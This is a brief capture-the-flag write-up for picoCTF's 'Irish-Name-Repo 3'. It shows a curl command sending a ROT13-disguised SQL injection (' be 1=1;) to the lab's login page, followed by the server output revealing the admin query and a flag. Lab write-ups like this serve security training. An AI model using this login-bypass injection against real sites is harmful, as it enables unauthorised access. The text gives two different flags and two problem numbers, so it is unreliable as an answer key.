# Irish-Name-Repo 3

## Descripción
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

## Pistas

Seems like the password is encrypted.

## Solución

```
# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}

___________________________________________________________________________________

┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4954i7ag}</p> 
```

## Bandera

picoCTF{3v3n_m0r3_SQL_4954i7ag}

## Notas adicionales



## Referencias
- https://jupiter.challenges.picoctf.org/problem/29132/
- http://jupiter.challenges.picoctf.org:29132